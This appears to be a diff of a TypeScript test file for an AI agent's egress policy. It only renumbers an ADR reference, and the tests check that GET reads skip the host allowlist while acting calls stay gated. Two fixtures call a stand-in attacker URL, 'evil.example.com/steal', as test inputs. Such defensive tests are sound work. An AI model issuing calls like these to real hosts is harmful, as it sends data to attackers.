@@ -26,7 +26,7 @@ import { searchCapability } from './tools/search.js';
  * resource from `args['path']` alone — so every tool call reached the kernel as
  * `{kind:'none'}` and the egress branch never once ran in production.
  *
- * ADR-0065 split that one branch into two: `url-read` (reading — `sys.http`,
+ * ADR-0066 split that one branch into two: `url-read` (reading — `sys.http`,
  * GET-only) never consults the allowlist at all, by decision; `url` (acting —
  * no shipped capability yet, stood in here) still does, unchanged. Both need
  * the same wiring proof this file always existed for: a real turn, the real
@@ -120,7 +120,7 @@ function harness(allowHost: boolean, script: ChatResult[] = [callTool('http_get'
   return { deps, fetched, provider: deps.provider as Scripted };
 }
 
-// A group member: taint 2. Before ADR-0065 the egress branch refused this
+// A group member: taint 2. Before ADR-0066 the egress branch refused this
 // outright rather than asking, for a host-holding `url` resource. `url-read`
 // has no such refusal to prove any more — the point of the tests below is
 // that a member reads exactly as freely as the owner does.
@@ -131,7 +131,7 @@ const member: Principal = {
   externalId: 'u1',
 };
 
-describe('reading is open, through a real turn (ADR-0065)', () => {
+describe('reading is open, through a real turn (ADR-0066)', () => {
   it.each([true, false])(
     'fetches regardless of the allowlist predicate (egressAllowed → %s) — url-read never consults it',
     async (allowHost) => {
@@ -158,7 +158,7 @@ describe('reading is open, through a real turn (ADR-0065)', () => {
     // changed: `http_get({url, path:'x'})` used to matter because a hardcoded
     // loop checked `path` before `url`. `resourceFor` (agent/loop.ts) reads
     // `decl.policyArgs` — `['url']` for `sys.http` — so an unrelated extra key
-    // was already inert before ADR-0065, and reading being open now means the
+    // was already inert before ADR-0066, and reading being open now means the
     // observable fact is simply that the fetch still happens.
     const h = harness(false, [
       callTool('http_get', { url: 'https://evil.example.com/steal', path: 'anything' }),
@@ -177,7 +177,7 @@ describe('reading is open, through a real turn (ADR-0065)', () => {
 });
 
 /**
- * `url` (acting) is untouched by ADR-0065: no shipped capability declares it
+ * `url` (acting) is untouched by ADR-0066: no shipped capability declares it
  * today (`sys.http` moved to `url-read`), so this stands in with a minimal
  * capability of the same shape — same `resourceKind`, same `policyArgs` — to
  * prove the *mechanism* a real turn still reaches it exactly as before.
@@ -237,7 +237,7 @@ function actHarness(allowHost: boolean, script: ChatResult[]) {
   return { deps, acted, provider: deps.provider as Scripted };
 }
 
-describe('acting is still gated, through a real turn — ADR-0065 opened reading, not the allowlist', () => {
+describe('acting is still gated, through a real turn — ADR-0066 opened reading, not the allowlist', () => {
   it('never runs the body when the host is off the allowlist', async () => {
     const h = actHarness(false, [callTool('url_act', { url: 'https://evil.example.com/steal' })]);
     await runTurn(h.deps, {
